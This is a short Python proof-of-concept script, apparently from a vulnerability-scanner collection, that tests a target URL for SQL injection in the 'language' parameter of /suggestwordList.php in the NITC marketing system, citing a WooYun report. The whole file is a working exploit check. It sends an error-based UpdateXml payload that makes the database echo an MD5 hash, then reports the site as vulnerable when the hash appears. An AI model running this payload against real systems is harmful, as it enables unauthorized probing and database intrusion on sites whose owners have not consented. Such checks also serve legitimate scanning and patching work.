#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: NITC营销系统suggestwordList.php SQL注入
referer: http://wooyun.org/bugs/wooyun-2010-066683
author: Lucifer
description: 文件/suggestwordList.php中,参数language存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['NITC营销系统suggestwordList.php SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/suggestwordList.php?searchWord=a&language=1%20Or%20UpDateXml(1,ConCat(0x5c,Md5(1234)),1)%23--"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
